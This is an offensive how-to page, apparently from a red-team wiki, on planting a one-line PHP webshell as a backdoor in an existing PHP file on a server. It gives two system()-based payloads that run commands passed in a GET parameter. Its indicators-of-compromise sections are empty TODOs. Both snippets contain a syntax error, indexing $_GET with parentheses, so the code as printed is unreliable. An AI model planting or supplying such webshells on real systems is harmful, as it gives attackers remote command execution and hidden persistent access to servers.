# Basic PHP Webshell Oneliner
## Summary

One of the easiest methods to obtain access to a PHP enabled app, is to somehow plant a webshell onto the server. There are many fancy PHP webshells out there, but this page will cover a basic one that is easy to remember and type, and is easy to embed into an existing PHP file as a backdoor.

## Prerequisites

A PHP enabled server, typically apache.

## Setup

To set this up, all that is needed is access to a PHP enabled server somehow. This can be through a vulnerability or any other type of access.

## Execution

### Method 1 - Shortest Possible

This is the shortest possible PHP webshell, the output from commands ran are not very pretty and will likely get mangled:

```php
<?php system($_GET('cmd')); ?>
```

#### Indicators of Compromise

TODO

### Method 2 - Slightly Prettier

This basic webshell wraps the output of the command into HTML pre tags, this will usually help prevent the output of the command from being mangled on the page.

```php
<?php echo "<pre>"; system($_GET('cmd')); echo "</pre>"; ?>
```

#### Indicators of Compromise

TODO